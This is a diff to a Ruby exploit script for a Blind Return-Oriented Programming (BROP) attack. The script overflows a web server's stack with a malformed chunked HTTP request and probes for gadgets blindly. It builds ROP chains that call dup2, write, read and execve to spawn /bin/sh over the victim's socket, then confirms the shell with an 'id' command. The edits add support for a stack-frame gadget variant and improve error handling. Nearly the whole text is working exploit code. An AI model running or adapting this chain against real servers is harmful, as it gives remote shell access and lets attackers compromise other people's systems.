@@ -34,6 +34,10 @@ $padval = 0x4141414141414141
 $to = 1
 $url = "/"
 
+# dmccrady:  extra POPs needed for RDI and RSI gadgets.  Defaults here for the standard BROP gadget.
+$arg1_extra_pops = 0
+$arg2_extra_pops = 1
+
 VSYSCALL_OLD		= 1
 VSYSCALL_UNALIGNED	= 2
 VSYSCALL_NEW		= 3
@@ -144,36 +148,36 @@ end
 def send_initial(s)
 	$reqs += 1
 
-        sz = 0xdeadbeefdeadbeeff.to_s(16)
+	sz = 0xdeadbeefdeadbeeff.to_s(16)
 
-        req = "GET #{$url} HTTP/1.1\r\n"
-        req << "Host: bla.com\r\n"
-        req << "Transfer-Encoding: Chunked\r\n"
-        req << "Connection: Keep-Alive\r\n"
-        req << "\r\n"
-        req << "#{sz}\r\n"
+	req = "GET #{$url} HTTP/1.1\r\n"
+	req << "Host: bla.com\r\n"
+	req << "Transfer-Encoding: Chunked\r\n"
+	req << "Connection: Keep-Alive\r\n"
+	req << "\r\n"
+	req << "#{sz}\r\n"
 
-        s.write(req)
+	s.write(req)
 	s.flush()
 
-        read_response(s)
+    read_response(s)
 end
 
 def send_exp(s, rop)
 	send_initial(s)
 
-        data = "A" * ($overflow_len - 8)
+    data = "A" * ($overflow_len - 8)
 	$pad.times do
 		padval = $padval
 		data << [padval].pack("Q") # rbp
 	end
 
-        data << rop.pack("Q*")
+    data << rop.pack("Q*")
 
 	set_canary(data)
 
-        s.write(data)                                                                                         
-        s.flush()                                                                                             
+    s.write(data)                                                                                         
+    s.flush()                                                                                             
 end
 
 def check_alive(s)
@@ -463,17 +467,71 @@ end
 
 # dmccrady: Encapsulate all ROP call voodoo into one spot.
 
+# This assumes that we found a BROP gadget, which is of the form:
+#		000:	5b                   	pop    %rbx 
+#		001:	5d                   	pop    %rbp
+#		002:	41 5c                	pop    %r12
+#		004:	41 5d                	pop    %r13
+#		006:	41 5e                	pop    %r14
+#		008:	41 5f                	pop    %r15
+#		00a:	c3                   	retq   
+#
+# Starting at offset 008+1 we get
+#		pop %rdi
+#		ret
+#
+# Starting at offset 006+1 we get
+#		pop %rsi
+#		pop %r15
+#		ret
+# which means we have to account for an extra pop for the second argument (RSI)
+#
+# We also want to flexibly support a modified BROP gadget, which is present when stack frames are required (e.g. with the -p option):
+#		038:	5b                   	pop    %rbx
+#		039:	41 5c                	pop    %r12
+#		03b:	41 5d                	pop    %r13
+#		03d:	41 5e                	pop    %r14
+#		03f:	41 5f                	pop    %r15
+#		041:	5d                   	pop    %rbp
+#		042:	c3                   	retq   
+#
+# Starting at offset 03f+1 we get
+#		pop %rdi
+#		pop %rbp
+#		ret
+# so we'll have to account for one extra POP for the first argument (RDI)
+#
+# Starting at offset 03d+1 we get
+#		pop %rsi
+#		pop %r15
+#		pop %rbp
+#		ret
+# so we'll have to account for two extra POPs for the second argument (RSI)
+
 def set_arg1(rop, arg1)
 	rop << $rdi
 	rop << arg1
+
+	# push extra on the stack to account for any extra POPs done by the RDI gadget.
+	$arg1_extra_pops.times do
+		rop << 0
+	end
 end
 
 def set_arg2(rop, arg2)
 	rop << $rdi - 2
 	rop << arg2
-	rop << 0
+
+	# push extra on the stack to account for any extra POPs done by the RSI gadget.
+	$arg2_extra_pops.times do
+		rop << 0
+	end
 end
 
+# dmccrady, arg3 isn't actually the value of the third argument, it's an argument to strcmp.
+def set_arg3(rop, arg3)
+	plt_call_2(rop, $strcmp, arg3, arg3)
+end
 
 def plt_call_1(rop, fnIdx, arg1)
 	set_arg1(rop, arg1)
@@ -489,7 +547,7 @@ end
 # dmccrady: Note that arg3 isn't actually the value
 # of the third argument, it's an argument to 'strcmp'
 def plt_call_3(rop, fnIdx, arg1, arg2, arg3 = 0x400000)
-	set_rdx(rop, arg3)
+	set_arg3(rop, arg3)  # arg3 needs to be set first since it wlll clobber RDI and RSI calling strcmp
 	set_arg1(rop, arg1)
 	set_arg2(rop, arg2)
 	plt_fn(rop, fnIdx)
@@ -527,17 +585,17 @@ def verify_pop(pop)
 #	ret = $ret ? $ret : pop + 1
 	ret = pop + 1
 
-        rop = Array.new($depth - 1) { |j| ret }
+    rop = Array.new($depth - 1) { |j| ret }
 	rop << pop + 1
 
-        return false if try_exp(rop) != true
+    return false if try_exp(rop) != true
 
-        rop = Array.new($depth) { |j| pop + 1 }
+    rop = Array.new($depth) { |j| pop + 1 }
 	rop[1] = $death
 
 	return false if try_exp(rop) != false
 
-        rop = Array.new($depth) { |j| ret }
+    rop = Array.new($depth) { |j| ret }
 	rop[0] = pop
 	rop[1] = 0x4141414141414141
 	rop[2] = $death
@@ -1061,12 +1119,6 @@ def try_plt(depth, plt)
 	return false
 end
 
-def set_rdx(rop, good = 0x400000)
-#	good = 0x400000
-#	good = $vsyscall + 100
-
-	plt_call_2(rop, $strcmp, good, good)
-end
 
 def got_write(x)
 ##	if $canary
@@ -1385,11 +1437,16 @@ def get_dist(gadget, inc)
 	dist = 0
 
 	for i in 1..7
-        rop = Array.new($depth) { |j| $plt }
+		addr = gadget + inc * i
 
-		rop[0] = gadget + inc * i
+		rop = Array.new($depth) { |j| $plt }
+		rop[0] = addr
 
-		break if try_exp(rop) != true
+		crashed = try_exp(rop)
+		#print("Probing possible gadget region #{addr.to_s(16)}, crashed=#{crashed}\n")
+		
+		break if crashed != true
+		
 		dist = i
 	end
 
@@ -1403,16 +1460,33 @@ def verify_gadget(gadget)
 	left  = get_dist(gadget, -1)
 	right = get_dist(gadget, 1)
 
-	return false if left + right != 6
-
-	print("LEFT #{left} RIGHT #{right} addr #{gadget.to_s(16)}\n")
-
 	rdi = gadget + right - 1
 
-	return check_rdi(rdi)
+	if left + right == 6      # 6 pops from the standard BROP gadget
+		return false if not check_multi_pop(rdi, 9, 6)
+		$rdi = rdi 
+		print("Found standard BROP gadget POP RDI at #{$rdi.to_s(16)}\n")
+		$arg1_extra_pops = 0
+		$arg2_extra_pops = 1
+		success = true
+	elsif left + right == 7   # 7 pops from the stack-frame BROP gadget
+		return false if not check_multi_pop(rdi, 9, 6)
+		$rdi = rdi - 1  # Move back over the 'pop rbp' which is one byte into 'pop %r15' == 'pop %rdi'
+		print("Found stack frame BROP gadget POP RDI at #{$rdi.to_s(16)}\n")
+		$arg1_extra_pops = 1
+		$arg2_extra_pops = 2
+		success = true
+	else
+		success = false
+	end
+
+	print("LEFT #{left} RIGHT #{right} addr #{gadget.to_s(16)}\n") if success
+
+	return success
 end
 
 def find_gadget()
+	return if $rdi
 	print("Finding gadget\n")
 
 	$start = $ret
@@ -1438,8 +1512,9 @@ def find_gadget()
 		if r == true
 			if verify_gadget(i)
 				print("Found POP at 0x#{i.to_s(16)}\n")
+				$pos = i
 				$pops << i
-				check_pop(i)
+				break
 			end
 		end
 
@@ -1453,6 +1528,7 @@ def find_gadget()
 
 		skip = 7
 	end
+
 end
 
 def find_plt_depth_aslr()
@@ -1594,22 +1670,6 @@ def do_read(rop, fd, writable, read = $read)
 end
 
 
-def do_read2(rop, fd, writable)
-
-	# 1. Call write
-	plt_call_3(rop, $write, fd, writable, $goodrdx)
-
-	# 2. Call usleep for 2 seconds
-	plt_call_1(rop, $usleep, 1000 * 1000 * 2)
-
-	# 3. Call read
-	plt_call_3(rop, $read, fd, writable, $goodrdx)
-
-	# 4. Call write
-	plt_call_3(rop, $write, fd, writable, $goodrdx)
-
-end
-
 def find_read()
 	print("Finding read\n")
 
@@ -1679,7 +1739,7 @@ def find_good_rdx()
 		send_exp(s, rop)
 		x = s.recv(4096)
 
-		print("find_good_rdx GOT #{x.length} at #{addr.to_s(16)}\n")
+		print("find_good_rdx got #{x.length} at #{addr.to_s(16)}\n")
 
 		if x.length >= 8
 			$goodrdx = addr
@@ -1703,39 +1763,62 @@ def do_execve()
 	str = "/bin/sh\0"
 
 	rop = []
+	#plt_call_1(rop, $usleep, 1000 * 1000 * 30)
 
-	#dup_fd(rop, fd)
-	#dup_fd(rop, 0, fd)
-	#dup_fd(rop, 1, fd)
-	#dup_fd(rop, 2, fd)
+	# Call dup2 to dup the victim's file descriptor to our known one.  Once we're in, we have control of stdin, stdout, and stderr.
+	#		dup2($file_desc, fd)
+	#		dup2(fd, 0)
+	#		dup2(fd, 1)
+	#		dup2(fd, 2)
 	plt_call_2(rop, $dup2, $file_desc, fd)
 	plt_call_2(rop, $dup2, fd, 0)
 	plt_call_2(rop, $dup2, fd, 1)
 	plt_call_2(rop, $dup2, fd, 2)
+	
 
-	do_read2(rop, fd, writable)
+	# Write back the current contents of the writable location.
+	plt_call_3(rop, $write, fd, writable, $goodrdx)
+
+	# Sleep for 2 seconds
+	plt_call_1(rop, $usleep, 1000 * 1000 * 2)
+
+	# Call read().  This will (hopefully) read our string "/bin/sh\0" into the writable location
+	plt_call_3(rop, $read, fd, writable, $goodrdx)
+
+	# Write the writable location back to us so we can verify it was done.
+	plt_call_3(rop, $write, fd, writable, $goodrdx)
 
 	# Call execve
-	plt_call_3(rop, $execve, writable, 0, 0x400000 + 8)
+	plt_call_3(rop, $execve, writable, 0x400000+8, 0x400000 + 8)
 
 	rop << $death
 
+	# Send the above shell-launching ROP to the target
+	print("Sending ROP chain:  write, sleep, read, write, execve\n")
 	s = get_child()
 	send_exp(s, rop)
 	x = s.recv(1)
+
+	# While our ROP chain is executing a read, send it the "/bin/sh" string.
+	print("Sending '#{str}' to victim\n")
 	s.write(str)
 
-	print("Wait 2 secs...\n")
+	print("Victim is waiting 2 secs...\n")
+
+	# Read back any output.  We should see "/bin/sh" in our output, which indicates
+	# that the write happened.
 
 	stuff = "" + x
 
 	while true
 		begin
 			x = s.recv(4096)
+		rescue SystemCallError => e 
+			print("Exception reading back sent info, err=#{e}\n")
+			break
 		rescue
 			break
 		end
-
 		break if x.length == 0
 
 		stuff += x
@@ -1751,18 +1834,28 @@ def do_execve()
 		return
 	end
 
+	# Send the "id" command, and look for "uid" in the output.
+	print("Assuming shell is launched, sending 'id' command\n")
 	s.write("\n\n\n\n\nid\n\n")
 
 	while true
 		begin
 			Timeout.timeout (1) do
 				x = s.recv(4096)
-		  end
-		rescue
+		  	end
+		rescue Timeout::Error
+			next
+		rescue SystemCallError => e 
+			print("Exception during final attack, err=#{e}\n")
 			break
+		rescue
+			print("Unknownn exception during final attack")
+			break;
 		end
 			
 		break if x.length == 0
+
+		print("Output from 'id':  #{x}\n")
 
 		if x.include?("uid")
 			#print("\nFound execve at #{i.to_s(16)}\n")
@@ -1865,7 +1958,7 @@ def read_sym()
 	dynstr = 0
 
 	while true
-		print("Reading #{addr.to_s(16)}\n")
+		print("Trying syms at #{addr.to_s(16)}\r")
 		x = dump_addr(addr)
 		break if x.length == 0
 
@@ -1874,7 +1967,7 @@ def read_sym()
 
 		# I know it can be more efficient...
 		if dynstr == 0 and has_str(prog)
-			print("Found strings at #{addr.to_s(16)}\n")
+			print("\nFound strings at #{addr.to_s(16)}\n")
 			for i in 0..(prog.length - 1)
 				if has_str(prog, i, true)
 					dynstr = addr_start + i
